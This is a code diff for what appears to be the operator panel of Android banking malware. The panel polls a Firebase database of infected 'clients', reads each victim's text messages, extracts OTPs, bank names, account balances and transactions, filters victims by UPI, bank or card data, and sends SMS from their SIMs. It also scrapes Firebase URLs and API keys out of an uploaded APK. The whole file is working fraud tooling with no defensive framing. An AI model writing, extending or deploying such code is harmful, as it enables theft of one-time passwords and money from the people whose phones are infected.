-                                    <span>${esc(d.network || '')}</span>
-                                </div>
-                                <div class="status-badge ${statusClass}">${statusText}</div>
-                                ${phone !== '—' ? `<div class="phone-display">📱 ${esc(phone)}</div>` : ''}
-                            </div>
-                        </div>
-                        ${balance ? `<div class="balance-info">
-                            <span class="label">Avl Bal</span>
-                            <span>₹${esc(balance)}</span>
-                            ${bankName ? `<span class="bank-name">${esc(bankName)}</span>` : ''}
-                        </div>` : ''}
-                        <div class="details">
-                            <div class="item"><small>Phone</small><div>${esc(phone)}</div></div>
-                            <div class="item"><small>Battery</small><div>${d.battery || 0}%</div></div>
-                        </div>
-                        <button class="send-btn-small" data-id="${d.id}" title="Send SMS">✉</button>
-                    </div>
-                `;
-            }).join('');
-
-            deviceGrid.querySelectorAll('.device-card').forEach(card => {
-                card.addEventListener('click', (e) => {
-                    if (e.target.closest('.send-btn-small')) return;
-                    const id = card.dataset.id;
-                    const dev = allDevices.find(d => d.id === id);
-                    if (dev) openDetail(dev);
-                });
-            });
-            deviceGrid.querySelectorAll('.send-btn-small').forEach(btn => {
-                btn.addEventListener('click', (e) => {
-                    e.stopPropagation();
-                    const id = btn.dataset.id;
-                    const dev = allDevices.find(d => d.id === id);
-                    if (dev) openDetail(dev);
-                });
-            });
-        }
-
-        // ─── UPDATE STATS ──────────────────────────────────────────────────
-        function updateStats() {
-            const total = allDevices.length;
-            const online = allDevices.filter(d => d.status).length;
-            const offline = total - online;
-            let bankTotal = 0;
-            let cardTotal = 0;
-            for (const id of Object.keys(messageCache)) {
-                bankTotal += getDeviceBankSms(id).length;
-                const dev = allDevices.find(d => d.id === id);
-                if (dev && dev.card) cardTotal++;
-            }
-            totalStat.textContent = total;
-            onlineStat.textContent = online;
-            offlineStat.textContent = offline;
-            bankStat.textContent = bankTotal;
-            cardStat.textContent = cardTotal;
-        }
-
-        // ─── DETAIL MODAL ──────────────────────────────────────────────────
-        async function openDetail(device) {
-            selectedDevice = device;
-            $('detailDeviceName').textContent = device.id;
-            $('detailStatus').textContent = device.status ? '● Online' : '○ Offline';
-            $('detailStatus').style.color = device.status ? 'var(--green)' : 'var(--muted)';
-            $('detailBattery').textContent = device.battery || 0;
-            const bankMsgs = getDeviceBankSms(device.id);
-            const allMsgs = messageCache[device.id] || [];
-            $('detailBankCount').textContent = bankMsgs.length;
-            $('detailSmsCount').textContent = allMsgs.length;
-            $('bankTabBadge').textContent = bankMsgs.length;
-            $('smsTabBadge').textContent = allMsgs.length;
-            detailPhoneDisplay.textContent = device.phone || '—';
-
-            renderInfoTab(device);
-            renderSims(device);
-            renderBankTab(device);
-            renderSmsList(device.id, '');
-
-            smsTo.value = device.phone || '';
-            smsBody.value = '';
-            sendResult.className = 'send-result';
-            sendResult.textContent = '';
-            sendDevicePhone.textContent = device.phone || '—';
-            updateSendBtnText();
-
-            switchTab('info');
-            detailModal.classList.add('active');
-
-            if (detailRefreshTimer) clearInterval(detailRefreshTimer);
-            detailRefreshTimer = setInterval(() => {
-                if (selectedDevice && detailModal.classList.contains('active')) {
-                    loadMessagesForDevice(selectedDevice.id).then(() => {
-                        const activeTab = document.querySelector('.tab-btn.active');
-                        if (activeTab) {
-                            const tab = activeTab.dataset.tab;
-                            if (tab === 'sms') renderSmsList(selectedDevice.id, smsSearch.value);
-                            else if (tab === 'bank') renderBankTab(selectedDevice);
-                            const bm = getDeviceBankSms(selectedDevice.id);
-                            const am = messageCache[selectedDevice.id] || [];
-                            $('detailBankCount').textContent = bm.length;
-                            $('detailSmsCount').textContent = am.length;
-                            $('bankTabBadge').textContent = bm.length;
-                            $('smsTabBadge').textContent = am.length;
-                        }
-                    });
-                }
-            }, 5000);
-        }
-
-        function renderInfoTab(device) {
-            detailGrid.innerHTML = `
-                <div class="detail-item"><div class="label">Phone Number</div><div class="value">${esc(device.phone || '—')}</div></div>
-                <div class="detail-item"><div class="label">Network</div><div class="value">${esc(device.network || '—')}</div></div>
-                <div class="detail-item"><div class="label">Android</div><div class="value">${esc(device.android || '—')}</div></div>
-                <div class="detail-item"><div class="label">IP Address</div><div class="value">${esc(device.ip || '—')}</div></div>
-                <div class="detail-item"><div class="label">Storage</div><div class="value">${esc(device.storage || '—')}</div></div>
-                <div class="detail-item"><div class="label">CPU Arch</div><div class="value">${esc(device.cpuArch || '—')}</div></div>
-                <div class="detail-item"><div class="label">SDK Version</div><div class="value">${esc(device.sdkVersion || '—')}</div></div>
-                <div class="detail-item"><div class="label">SIM Cards</div><div class="value">${device.sims ? device.sims.length + ' SIM(s)' : '0 SIM(s)'}</div></div>
-            `;
-        }
-
-        function renderSims(device) {
-            if (!device.sims || !device.sims.length) {
-                detailSims.innerHTML = '<div style="color:var(--muted);padding:8px">—</div>';
-                return;
-            }
-            detailSims.innerHTML = device.sims.map((s,i) => `
-                <div style="font-size:13px;margin:2px 0">Phone #${i+1}: ${esc(s.phoneNumber || '')}</div>
-                <div style="font-size:13px;margin:2px 0;margin-bottom:8px">Network #${i+1}: ${esc(s.network || '')}</div>
-            `).join('');
-        }
-
-        function renderBankTab(device) {
-            const bankMsgs = getDeviceBankSms(device.id);
-            const balance = getLatestBalance(device.id);
-            bankBalance.textContent = balance ? '₹' + esc(balance) : '—';
-
-            let bankName = '—';
-            if (bankMsgs.length > 0) {
-                const first = bankMsgs[0];
-                const detected = detectBankName(first.message, first.sender);
-                if (detected) bankName = detected;
-            }
-            bankNameDisplay.textContent = bankName;
-
-            if (!bankMsgs.length) {
-                bankMessageList.innerHTML = '<div style="color:var(--muted);padding:12px">No bank transactions.</div>';
-                return;
-            }
-
-            bankMessageList.innerHTML = bankMsgs.slice(0, 50).map(m => {
-                const otp = extractOtp(m);
-                const txType = detectTxType(m.message);
-                const bank = detectBankName(m.message, m.sender);
-                const txLabel = txType === 'credit' ? '💰 Credit' :
-                               txType === 'debit' ? '💸 Debit' : '🏦 Bank';
-                const txClass = txType === 'credit' ? 'credit' : txType === 'debit' ? 'debit' : '';
-                const bal = extractBalance(m);
-                return `
-                    <div class="sms-item">
-                        <div class="sms-header">
-                            <span>${esc(m.sender || 'Unknown')}</span>
-                            <span>${esc(m.dateTime || '')}</span>
-                        </div>
-                        <div class="sms-body">${esc(m.message)}</div>
-                        ${otp ? `<div class="sms-otp">🔐 OTP: ${otp}</div>` : ''}
-                        ${bank ? `<div class="bank-name-tag">🏛️ ${esc(bank)}</div>` : ''}
-                        ${txType ? `<div class="tx-type ${txClass}">${txLabel}</div>` : ''}
-                        ${bal ? `<div class="balance-tag">💰 Avl Bal: ₹${esc(bal)}</div>` : ''}
-                    </div>
-                `;
-            }).join('');
-        }
-
-        function renderSmsList(deviceId, search = '') {
-            const msgs = messageCache[deviceId] || [];
-            const filtered = search ? msgs.filter(m =>
-                m.message.toLowerCase().includes(search.toLowerCase()) ||
-                (m.sender && m.sender.toLowerCase().includes(search.toLowerCase()))
-            ) : msgs;
-            $('smsCountLabel').textContent = `(${filtered.length})`;
-            const container = $('messageList');
-            if (!filtered.length) {
-                container.innerHTML = '<div style="color:var(--muted);padding:12px">No messages.</div>';
-                return;
-            }
-            container.innerHTML = filtered.slice(0, 150).map(m => {
-                const otp = extractOtp(m);
-                const bank = isBankSms(m);
-                const numMatch = m.message.match(/(\+91|0)?[6-9]\d{9}/);
-                const hasPhone = numMatch ? true : false;
-                const txType = detectTxType(m.message);
-                const txClass = txType === 'credit' ? 'credit' : txType === 'debit' ? 'debit' : '';
-                const txLabel = txType === 'credit' ? '💰 Credit' :
-                               txType === 'debit' ? '💸 Debit' : '';
-                const bankName = detectBankName(m.message, m.sender);
-                const bal = extractBalance(m);
-                return `
-                    <div class="sms-item">
-                        <div class="sms-header">
-                            <span>${esc(m.sender || 'Unknown')}</span>
-                            <span>${esc(m.dateTime || '')}</span>
-                        </div>
-                        <div class="sms-body">${esc(m.message)}</div>
-                        ${otp ? `<div class="sms-otp">🔐 OTP: ${otp}</div>` : ''}
-                        ${bank ? `<div class="bank-tag">🏦 Bank</div>` : ''}
-                        ${bankName ? `<div class="bank-name-tag">🏛️ ${esc(bankName)}</div>` : ''}
-                        ${txType ? `<div class="tx-type ${txClass}">${txLabel}</div>` : ''}
-                        ${bal ? `<div class="balance-tag">💰 Avl Bal: ₹${esc(bal)}</div>` : ''}
-                        ${hasPhone ? `<div class="phone-tag">📱 ${esc(numMatch[0])}</div>` : ''}
-                    </div>
-                `;
-            }).join('');
-        }
-
-        async function loadMessagesForDevice(deviceId) {
-            try {
-                const data = await fbGet('messages/' + deviceId);
-                let msgs = parseMessages(data);
-                if (msgs.length > 150) msgs = msgs.slice(0, 150);
-                messageCache[deviceId] = msgs;
-            } catch(e) {
-                messageCache[deviceId] = [];
-            }
-        }
-
-        function switchTab(tabId) {
-            tabBtns.forEach(btn => btn.classList.toggle('active', btn.dataset.tab === tabId));
-            Object.keys(tabContents).forEach(key => {
-                tabContents[key].classList.toggle('active', key === tabId);
-            });
-        }
-
-        tabBtns.forEach(btn => {
-            btn.addEventListener('click', () => {
-                const tab = btn.dataset.tab;
-                switchTab(tab);
-                if (selectedDevice) {
-                    if (tab === 'bank') renderBankTab(selectedDevice);
-                    else if (tab === 'sms') renderSmsList(selectedDevice.id, smsSearch.value);
-                }
-            });
-        });
-
-        // ─── SEND SMS ──────────────────────────────────────────────────────
-        function updateSendBtnText() {
-            sendSmsBtn.textContent = '📤 Send via SIM ' + simChoice;
-        }
-
-        async function sendSms() {
-            if (!selectedDevice) { toast('No device selected', 'error'); return; }
-            const to = smsTo.value.trim();
-            const body = smsBody.value.trim();
-            if (!to || !body) { toast('Enter number and message', 'error'); return; }
-            sendSmsBtn.disabled = true;
-            sendResult.className = 'send-result';
-            sendResult.textContent = 'Sending…';
-
-            try {
-                const payload = {
-                    sim: simChoice,
-                    to: to,
-                    message: body,
-                    sent: true,
-                    timestamp: new Date().toISOString()
-                };
-                const path = 'messages/' + selectedDevice.id + '/outgoing_' + Date.now();
-                await fbSet(path, payload);
-                sendResult.className = 'send-result ok';
-                sendResult.textContent = '✅ Sent successfully';
-                toast('SMS sent', 'success');
-                await loadMessagesForDevice(selectedDevice.id);
-                renderSmsList(selectedDevice.id, smsSearch.value);
-                renderBankTab(selectedDevice);
-                const bm = getDeviceBankSms(selectedDevice.id);
-                const am = messageCache[selectedDevice.id] || [];
-                $('detailBankCount').textContent = bm.length;
-                $('detailSmsCount').textContent = am.length;
-                $('bankTabBadge').textContent = bm.length;
-                $('smsTabBadge').textContent = am.length;
-            } catch(e) {
-                sendResult.className = 'send-result err';
-                sendResult.textContent = '❌ Error: ' + e.message;
-                toast('Send failed', 'error');
-            } finally {
-                sendSmsBtn.disabled = false;
-                updateSendBtnText();
-            }
-        }
-
-        // ─── POLLING ────────────────────────────────────────────────────────
-        function startPolling() {
-            if (pollTimer) clearInterval(pollTimer);
-            pollTimer = setInterval(() => {
-                if (activeConn) refreshDevices();
-            }, 8000);
-        }
-
-        function stopPolling() {
-            if (pollTimer) clearInterval(pollTimer);
-            pollTimer = null;
-            if (detailRefreshTimer) clearInterval(detailRefreshTimer);
-            detailRefreshTimer = null;
-            if (clockTimer) clearInterval(clockTimer);
-            clockTimer = null;
-        }
-
-        function esc(str) {
-            if (!str) return '';
-            const div = document.createElement('div');
-            div.textContent = str;
-            return div.innerHTML;
-        }
-
-        // ─── EVENT BINDING ──────────────────────────────────────────────────
-        $('newConnBtn').addEventListener('click', () => {
-            accLabel.value = '';
-            accUrl.value = '';
-            accKey.value = '';
-            setupError.classList.add('hidden');
-            newAccountModal.classList.add('active');
-        });
-        closeAccount.addEventListener('click', () => newAccountModal.classList.remove('active'));
-        cancelAccountBtn.addEventListener('click', () => newAccountModal.classList.remove('active'));
-        newAccountModal.addEventListener('click', (e) => {
-            if (e.target === newAccountModal) newAccountModal.classList.remove('active');
-        });
-
-        apkUploadArea.addEventListener('click', () => apkFileInput.click());
-        apkFileInput.addEventListener('change', (e) => {
-            const file = e.target.files[0];
-            if (!file) return;
-            const reader = new FileReader();
-            reader.onload = (ev) => {
-                let content = ev.target.result;
-                if (content instanceof ArrayBuffer) {
-                    const decoder = new TextDecoder('utf-8', { fatal: false });
-                    content = decoder.decode(content);
-                }
-                const urlMatch = content.match(/(https?:\/\/[^\s"']+\.firebaseio\.com)/);
-                const keyMatch = content.match(/AIza[0-9A-Za-z_-]{35}/);
-                if (urlMatch) accUrl.value = urlMatch[1];
-                if (keyMatch) accKey.value = keyMatch[0];
-                if (urlMatch || keyMatch) toast('Extracted from file', 'success');
-                else toast('No Firebase credentials found', 'error');
-            };
-            reader.readAsArrayBuffer(file);
-        });
-
-        saveAccountBtn.addEventListener('click', () => {
-            const url = accUrl.value.trim();
-            const key = accKey.value.trim();
-            if (!url) {
-                setupError.textContent = 'Firebase URL dalna zaroori hai';
-                setupError.classList.remove('hidden');
-                return;
-            }
-            if (!key) {
-                setupError.textContent = 'API Key bhi zaroori hai bhai';
-                setupError.classList.remove('hidden');
-                return;
-            }
-            // Check duplicate
-            const dup = CONNECTIONS.find(c => c.url === url);
-            if (dup) {
-                setupError.textContent = '⚠️ Already exists: "' + (dup.label || dup.url) + '"';
-                setupError.classList.remove('hidden');
-                toast('Firebase already exists!', 'error');
-                return;
-            }
-            // Auto-label from URL
-            let label = accLabel.value.trim();
-            if (!label) {
-                try { label = new URL(url).hostname.replace(/\.firebaseio\.com.*/,''); }
-                catch(e) { label = url.replace(/https?:\/\//,'').replace(/\.firebaseio\.com.*/,''); }
-            }
-            setupError.classList.add('hidden');
-            const conn = {
-                label: label,
-                url: url,
-                key: key,
-                date: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
-            };
-            CONNECTIONS.push(conn);
             localStorage.setItem('rsx_connections', JSON.stringify(CONNECTIONS));
-            newAccountModal.classList.remove('active');
+            activeConn = conn;
             renderConnections();
-            toast('Account "' + label + '" saved! Ab Connect kar le.', 'success');
-            updateShareLink();
-        });
-
-        searchInput.addEventListener('input', () => {
-            searchQuery = searchInput.value;
-            renderDeviceGrid();
-        });
-
-        document.querySelectorAll('.filter').forEach(btn => {
-            btn.addEventListener('click', () => {
-                document.querySelectorAll('.filter').forEach(b => b.classList.remove('active'));
-                btn.classList.add('active');
-                filterMode = btn.dataset.filter;
-                renderDeviceGrid();
-            });
-        });
-
-        let sortToggle = false;
-        $('sortBtn').addEventListener('click', () => {
-            sortToggle = !sortToggle;
-            sortMode = sortToggle ? 'oldest' : 'newest';
-            $('sortBtn').textContent = 'Sort: ' + (sortToggle ? 'Oldest' : 'Newest');
-            renderDeviceGrid();
-        });
-
-        $('logoutBtn').addEventListener('click', () => {
-            stopPolling();
-            activeConn = null;
-            allDevices = [];
-            dashboardScreen.style.display = 'none';
-            showHome();
-            toast('Disconnected');
-        });
-
-        closeDetail.addEventListener('click', () => {
-            detailModal.classList.remove('active');
-            if (detailRefreshTimer) clearInterval(detailRefreshTimer);
-            detailRefreshTimer = null;
-        });
-        detailModal.addEventListener('click', (e) => {
-            if (e.target === detailModal) {
-                detailModal.classList.remove('active');
-                if (detailRefreshTimer) clearInterval(detailRefreshTimer);
-                detailRefreshTimer = null;
-            }
-        });
-
-        smsSearch.addEventListener('input', () => {
-            if (selectedDevice) renderSmsList(selectedDevice.id, smsSearch.value);
-        });
-
-        $('refreshSmsBtn').addEventListener('click', async () => {
-            if (selectedDevice) {
-                await loadMessagesForDevice(selectedDevice.id);
-                renderSmsList(selectedDevice.id, smsSearch.value);
-                renderBankTab(selectedDevice);
-                const bm = getDeviceBankSms(selectedDevice.id);
-                const am = messageCache[selectedDevice.id] || [];
-                $('detailBankCount').textContent = bm.length;
-                $('detailSmsCount').textContent = am.length;
-                $('bankTabBadge').textContent = bm.length;
-                $('smsTabBadge').textContent = am.length;
-            }
-        });
-
-        sendSmsBtn.addEventListener('click', sendSms);
-
-        document.querySelectorAll('.sim-toggle button').forEach(btn => {
-            btn.addEventListener('click', () => {
-                document.querySelectorAll('.sim-toggle button').forEach(b => b.classList.remove('active'));
-                btn.classList.add('active');
-                simChoice = parseInt(btn.dataset.sim);
-                updateSendBtnText();
-            });
-        });
-
-        // ─── INIT ──────────────────────────────────────────────────────────
-        const loaded = loadFromURL();
-        if (!loaded) {
-            renderConnections();
+            showDashboard();
+            toast('Auto‑connected from shared link', 'success');
+            return true;
         }
-        updateShareLink();
-        console.log('RS X PANEL v3.1 · All issues resolved.');
-        console.log('✓ Account creation works, SMS sorted correctly, 404 handled.');
-    </script>
+    }
+    return false;
+}
+
+function showHome() {
+    homeScreen.classList.remove('hidden');
+    dashboardScreen.style.display = 'none';
+    renderConnections();
+    if (clockTimer) clearInterval(clockTimer);
+    if (pollTimer) clearInterval(pollTimer);
+    pollTimer = null;
+    updateShareLink();
+}
+
+function showDashboard() {
+    homeScreen.classList.add('hidden');
+    dashboardScreen.style.display = 'block';
+    startClock();
+    updateShareLink();
+    const cached = localStorage.getItem('rsx_cache_' + activeConn.url);
+    if (cached) {
+        try {
+            const data = JSON.parse(cached);
+            allDevices = data.devices || [];
+            messageCache = data.messages || {};
+            renderDeviceGrid();
+            updateStats();
+        } catch(e) {}
+    }
+    refreshDevices();
+    startPolling();
+}
+
+function renderConnections() {
+    if (!connectionsList) return;
+    if (CONNECTIONS.length === 0) {
+        connectionsList.innerHTML = `<div style="color:var(--muted);padding:12px;text-align:center">No accounts saved.</div>`;
+        connCount.textContent = '0';
+        shareLinkInput.value = '';
+        return;
+    }
+    connCount.textContent = CONNECTIONS.length;
+    connectionsList.innerHTML = CONNECTIONS.map((c, i) => {
+        const displayLabel = c.label || c.url.replace(/https?:\/\//,'').replace(/\.firebaseio\.com.*/,'');
+        const shortLabel = displayLabel.length > 15 ? displayLabel.substring(0, 15) + '…' : displayLabel;
+        return `
+            <div class="conn-item">
+                <div class="info">
+                    <div class="name">${esc(shortLabel)}</div>
+                    <div class="date">${c.date || ''}</div>
+                </div>
+                <button class="copy-link" data-idx="${i}" title="Copy share link">🔗</button>
+                <button class="connect" data-idx="${i}" title="Connect">▶</button>
+                <button class="del" data-idx="${i}" title="Delete">✕</button>
+            </div>
+        `;
+    }).join('');
+
+    connectionsList.querySelectorAll('.copy-link').forEach(btn => {
+        btn.addEventListener('click', () => {
+            const idx = parseInt(btn.dataset.idx);
+            const conn = CONNECTIONS[idx];
+            if (!conn) return;
+            const encoded = encodeFirebaseConn(conn.url, conn.key || '');
+            const link = window.location.origin + window.location.pathname + '?s=' + encoded;
+            navigator.clipboard.writeText(link).then(() => {
+                toast('🔗 Link Copied!', 'success');
+            }).catch(() => {
+                const input = document.createElement('input');
+                input.value = link;
+                document.body.appendChild(input);
+                input.select();
+                document.execCommand('copy');
+                document.body.removeChild(input);
+                toast('🔗 Link Copied!', 'success');
+            });
+        });
+    });
+
+    connectionsList.querySelectorAll('.connect').forEach(btn => {
+        btn.addEventListener('click', () => {
+            const idx = parseInt(btn.dataset.idx);
+            const conn = CONNECTIONS[idx];
+            if (conn) {
+                activeConn = conn;
+                showDashboard();
+                toast('Connected to ' + (conn.label || conn.url.replace(/https?:\/\//,'').substring(0,20)), 'success');
+            }
+        });
+    });
+    connectionsList.querySelectorAll('.del').forEach(btn => {
+        btn.addEventListener('click', () => {
+            const idx = parseInt(btn.dataset.idx);
+            const label = CONNECTIONS[idx].label || CONNECTIONS[idx].url.replace(/https?:\/\//,'').substring(0,20);
+            if (confirm('Delete "' + label + '"?')) {
+                CONNECTIONS.splice(idx, 1);
+                localStorage.setItem('rsx_connections', JSON.stringify(CONNECTIONS));
+                renderConnections();
+                toast('Deleted', 'error');
+            }
+        });
+    });
+}
+
+function fbUrl(path) {
+    const base = activeConn.url.replace(/\/+$/,'');
+    const auth = activeConn.key ? '?auth=' + activeConn.key : '';
+    return base + '/' + path + '.json' + auth;
+}
+
+async function fbGet(path) {
+    const url = fbUrl(path);
+    const res = await fetch(url);
+    if (!res.ok) {
+        let msg = await res.text();
+        throw new Error(`HTTP ${res.status}: ${msg.substring(0,50)}`);
+    }
+    return res.json();
+}
+
+async function fbSet(path, data) {
+    const url = fbUrl(path);
+    const res = await fetch(url, {
+        method: 'PUT',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
+    });
+    if (!res.ok) {
+        let msg = await res.text();
+        throw new Error(`HTTP ${res.status}: ${msg.substring(0,50)}`);
+    }
+    return res.json();
+}
+
+function parseDevices(data) {
+    if (!data || typeof data !== 'object') return [];
+    return Object.keys(data).map(id => {
+        const d = data[id];
+        return {
+            id,
+            name: d.name || d.deviceName || d.device_name || id,
+            phone: d.mobNo || d.phone || d.phoneNumber || d.phone_number || '',
+            deviceName: d.deviceName || d.device_name || d.name || '',
+            phoneName: d.phoneName || d.phone_name || d.deviceName || '',
+            battery: d.batteryNum || d.battery || 0,
+            status: d.status === true || d.online === true,
+            note: d.note || d.notes || '',
+            sims: d.sims || [],
+            android: d.android || '',
+            ip: d.ip || '',
+            joined: d.joined || '',
+            network: d.network || d.carrier || '',
+            storage: d.storage || '',
+            cpuArch: d.cpuArch || d.cpu || '',
+            sdkVersion: d.sdkVersion || '',
+            favorite: d.favorite || false,
+            upi: d.upi || false,
+            bank: d.bank || false,
+            card: d.card || false,
+            ...d
+        };
+    });
+}
+
+async function refreshDevices() {
+    if (!activeConn || isLoading) return;
+    isLoading = true;
+    statusLabel.textContent = '● Loading...';
+    statusLabel.style.color = 'var(--gold)';
+    statusLabel.style.borderColor = 'rgba(246,207,69,0.2)';
+    statusLabel.style.background = 'rgba(246,207,69,0.06)';
+
+    try {
+        const data = await fbGet('clients');
+        allDevices = parseDevices(data);
+        updateStats();
+        renderDeviceGrid();
+
+        await Promise.allSettled(allDevices.map(d => loadMessagesForDevice(d.id)));
+
+        autoDetectPhoneNumbers();
+        renderDeviceGrid();
+        updateStats();
+
+        // FIX: Don't cache messages to avoid quota exceeded
+        try {
+            const cache = { devices: allDevices };
+            localStorage.setItem('rsx_cache_' + activeConn.url, JSON.stringify(cache));
+        } catch(e) {
+            console.warn('Cache storage failed (quota exceeded)');
+        }
+
+        statusLabel.textContent = '● Connected';
+        statusLabel.style.color = 'var(--green)';
+        statusLabel.style.borderColor = 'rgba(0,214,143,0.2)';
+        statusLabel.style.background = 'rgba(0,214,143,0.06)';
+    } catch (e) {
+        statusLabel.textContent = '● Error';
+        statusLabel.style.color = 'var(--red)';
+        statusLabel.style.borderColor = 'rgba(255,77,77,0.2)';
+        statusLabel.style.background = 'rgba(255,77,77,0.06)';
+        toast('Failed to fetch devices: ' + e.message, 'error');
+    } finally {
+        isLoading = false;
+    }
+}
+
+function autoDetectPhoneNumbers() {
+    for (const d of allDevices) {
+        const msgs = messageCache[d.id] || [];
+        let detectedNumber = null;
+        for (const msg of msgs) {
+            const text = msg.message;
+            if (text.toLowerCase().includes('plan expire') ||
+                text.toLowerCase().includes('plan expired') ||
+                text.toLowerCase().includes('main number') ||
+                text.toLowerCase().includes('mob no') ||
+                text.toLowerCase().includes('phone no')) {
+                const numMatch = text.match(/(\+91|0)?[6-9]\d{9}/);
+                if (numMatch) { detectedNumber = numMatch[0]; break; }
+            }
+            const numMatch = text.match(/(\+91|0)?[6-9]\d{9}/);
+            if (numMatch) {
+                const before = text.substring(0, text.indexOf(numMatch[0])).toLowerCase();
+                if (before.includes('no') || before.includes('number') || before.includes('mob') ||
+                    before.includes('phone') || before.includes('sim') || before.includes('expire')) {
+                    detectedNumber = numMatch[0];
+                    break;
+                }
+            }
+        }
+        if (detectedNumber && !d.phone) {
+            d.phone = detectedNumber;
+            try { fbSet('clients/' + d.id + '/phone', detectedNumber); } catch(e) {}
+        }
+    }
+}
+
+function parseDate(str) {
+    if (!str) return 0;
+    const s = String(str).trim();
+    let d = new Date(s);
+    if (!isNaN(d.getTime())) return d.getTime();
+
+    const m1 = s.match(/(\d{1,2})[\/\-\.](\d{1,2})[\/\-\.](\d{4})\s*[|\,\s]+\s*(\d{1,2}):(\d{2})\s*(AM|PM|am|pm)/i);
+    if (m1) {
+        let hour = parseInt(m1[4], 10);
+        const minute = parseInt(m1[5], 10);
+        const ampm = m1[6].toUpperCase();
+        if (ampm === 'PM' && hour !== 12) hour += 12;
+        if (ampm === 'AM' && hour === 12) hour = 0;
+        d = new Date(parseInt(m1[3]), parseInt(m1[2])-1, parseInt(m1[1]), hour, minute, 0);
+        if (!isNaN(d.getTime())) return d.getTime();
+    }
+
+    const m2 = s.match(/(\d{1,2})[\/\-\.](\d{1,2})[\/\-\.](\d{4})\s*[|\,\s]+\s*(\d{1,2}):(\d{2}):(\d{2})\s*(AM|PM|am|pm)/i);
+    if (m2) {
+        let hour = parseInt(m2[4], 10);
+        const minute = parseInt(m2[5], 10);
+        const second = parseInt(m2[6], 10);
+        const ampm = m2[7].toUpperCase();
+        if (ampm === 'PM' && hour !== 12) hour += 12;
+        if (ampm === 'AM' && hour === 12) hour = 0;
+        d = new Date(parseInt(m2[3]), parseInt(m2[2])-1, parseInt(m2[1]), hour, minute, second);
+        if (!isNaN(d.getTime())) return d.getTime();
+    }
+
+    const m3 = s.match(/(\d{1,2})[\/\-\.](\d{1,2})[\/\-\.](\d{4})\s+(\d{1,2}):(\d{2}):(\d{2})/);
+    if (m3) {
+        d = new Date(+m3[3], +m3[2]-1, +m3[1], +m3[4], +m3[5], +m3[6]);
+        if (!isNaN(d.getTime())) return d.getTime();
+    }
+
+    const m4 = s.match(/(\d{1,2})[\/\-\.](\d{1,2})[\/\-\.](\d{4})\s+(\d{1,2}):(\d{2})/);
+    if (m4) {
+        d = new Date(+m4[3], +m4[2]-1, +m4[1], +m4[4], +m4[5], 0);
+        if (!isNaN(d.getTime())) return d.getTime();
+    }
+
+    const m5 = s.match(/(\d{1,2})[\/\-\.](\d{1,2})[\/\-\.](\d{4})/);
+    if (m5) {
+        d = new Date(+m5[3], +m5[2]-1, +m5[1]);
+        if (!isNaN(d.getTime())) return d.getTime();
+    }
+
+    const num = parseInt(str);
+    if (!isNaN(num) && num > 1000000000) {
+        return num > 1000000000000 ? num : num * 1000;
+    }
+    return 0;
+}
+
+function parseMessages(data) {
+    if (!data || typeof data !== 'object') return [];
+    return Object.entries(data).map(([key, m]) => {
+        const rawDt = m.dateTime || m.timestamp || m.time || '';
+        return {
+            key,
+            message: m.message || m.text || '',
+            sender: m.sender || '',
+            dateTime: rawDt,
+            type: m.type || 'incoming',
+            otp: m.otp || '',
+            _ts: parseDate(rawDt)
+        };
+    }).sort((a, b) => {
+        if (a._ts && b._ts) return b._ts - a._ts;
+        if (a._ts && !b._ts) return -1;
+        if (!a._ts && b._ts) return 1;
+        return a.key > b.key ? -1 : (a.key < b.key ? 1 : 0);
+    });
+}
+
+async function loadMessagesForDevice(deviceId) {
+    try {
+        const data = await fbGet('messages/' + deviceId);
+        let msgs = parseMessages(data);
+        if (msgs.length > 150) msgs = msgs.slice(0, 150);
+        messageCache[deviceId] = msgs;
+    } catch(e) {
+        messageCache[deviceId] = [];
+    }
+}
+
+function renderDeviceGrid() {
+    const q = searchQuery.toLowerCase().trim();
+    let filtered = allDevices;
+    if (filterMode === 'online') filtered = filtered.filter(d => d.status);
+    else if (filterMode === 'offline') filtered = filtered.filter(d => !d.status);
+    else if (filterMode === 'favorite') filtered = filtered.filter(d => d.favorite === true);
+    else if (filterMode === 'upi') filtered = filtered.filter(d => d.upi === true);
+    else if (filterMode === 'bank') filtered = filtered.filter(d => deviceHasBankSms(d.id));
+    else if (filterMode === 'card') filtered = filtered.filter(d => d.card === true);
+
+    if (q) filtered = filtered.filter(d =>
+        d.name.toLowerCase().includes(q) ||
+        d.id.toLowerCase().includes(q) ||
+        (d.phone && d.phone.includes(q)) ||
+        (d.deviceName && d.deviceName.toLowerCase().includes(q))
+    );
+
+    if (sortMode === 'newest') filtered.sort((a,b) => (a.joined > b.joined ? -1 : 1));
+    else filtered.sort((a,b) => (a.joined > b.joined ? 1 : -1));
+
+    if (filtered.length === 0) {
+        deviceGrid.innerHTML = `
+            <div class="empty-state">
+                <div class="shield-icon">🛡️</div>
+                <h3>No devices connected</h3>
+                <p>Waiting for devices to register...</p>
+                <div class="auto-refresh-pill">
+                    <div class="pulse-dot"></div>
+                    <span>Auto-refreshing every 8s</span>
+                </div>
+            </div>
+        `;
+        return;
+    }
+
+    deviceGrid.innerHTML = filtered.map(d => {
+        const bankMsgs = getDeviceBankSms(d.id);
+        const balance = getLatestBalance(d.id);
+        const bankName = getLatestBankName(d.id);
+        const phone = d.phone || '—';
+        const statusText = d.status ? 'Online' : 'Offline';
+        const statusClass = d.status ? 'online' : 'offline';
+        const displayName = d.deviceName || d.name || d.id;
+        return `
+            <div class="device-card" data-id="${d.id}">
+                <div class="top">
+                    <div class="icon ${d.status ? 'online' : ''}">${d.status ? '●' : '○'}</div>
+                    <div class="info">
+                        <div class="name">${esc(displayName)}</div>
+                        <div class="sub">
+                            <span>${esc(d.android || 'Android')}</span>
+                            <span>🔋 ${d.battery || 0}</span>
+                            <span>${esc(d.network || '')}</span>
+                        </div>
+                        <div class="status-badge ${statusClass}">${statusText}</div>
+                        ${phone !== '—' ? `<div class="phone-display">📱 ${esc(phone)}</div>` : ''}
+                    </div>
+                </div>
+                ${balance ? `<div class="balance-info">
+                    <span class="label">Avl Bal</span>
+                    <span>₹${esc(balance)}</span>
+                    ${bankName ? `<span class="bank-name">${esc(bankName)}</span>` : ''}
+                </div>` : ''}
+                <div class="details">
+                    <div class="item"><small>Phone</small><div>${esc(phone)}</div></div>
+                    <div class="item"><small>Device ID</small><div>${esc(d.id)}</div></div>
+                </div>
+                <button class="send-btn-small" data-id="${d.id}" title="Send SMS">✉</button>
+            </div>
+        `;
+    }).join('');
+
+    deviceGrid.querySelectorAll('.device-card').forEach(card => {
+        card.addEventListener('click', (e) => {
